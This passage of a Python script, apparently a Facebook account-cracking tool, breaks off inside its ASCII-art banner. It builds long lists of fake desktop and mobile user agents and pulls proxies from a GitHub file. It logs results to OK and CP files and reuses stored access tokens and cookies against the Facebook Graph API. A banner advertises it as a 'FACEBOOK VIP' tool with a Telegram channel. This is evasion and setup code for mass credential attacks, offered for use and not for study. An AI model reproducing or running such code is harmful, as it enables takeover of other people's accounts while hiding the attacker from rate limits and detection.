rv:109.0) Gecko/20100101 Firefox/116.0', 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.81', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5.2 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.4 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/113.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5.2 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.75 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.4 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36']
ugen2=['Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.75 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.41', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.75 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0']
ugen=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/113.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.41', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/113.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5.2 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0']
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox = requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt', 'w').write(prox)
except Exception as e:
	print(' ')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='11; Redmi Note 5A Lite)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/96.0.4664.45 Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2101K6G'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['9','10','11','12'])
	c=random.choice(['V2147'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	ugen.append(uaku2)
		
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['2201116PG'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3115 Build/SP1A.210812.016; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SHARK KTUS-H0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
	
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X688B'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
					
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ @k6_vk ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ HSSEIN]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ @k6_vk ]---------------#


import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
	except IOError:
		login_lagi334()

def banner():
	pass		
def menu(sy2,sy3):
	
	ip = requests.get("https://api.ipify.org").text
	
	os.system('clear')
	banner()
	print(f"""{asu}
‏ܙܠܠ𐫘ُܩّܢ ࡎَܠِّࡉ 𐭦ٙߺܠܨ ܩُܥٙܩ𐫔 ࠁَ𐬦ٓܠࡉ  ܩُܥٙܩ𐫔ٍ
معرف القناة: @tt_beno_8
——————————————
𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑽𝑰𝑷
——————————————
""")
	print(f"""'
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠉⠓⠤⣄⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠖⢲⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡄⠀⠀⡆⠀⢱⠀⡴⠛⡆⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠤⠤⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢇⠀⠀⡇⠀⠀⢃⡇⠀⠘⡆⠀⠀⢸⠀⠀⠀⠀⠀⡤⠎⠁⠀⠀⠀⠀⠀⠙⠦⣄⠀⠀⠀⠀⠀⢰⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
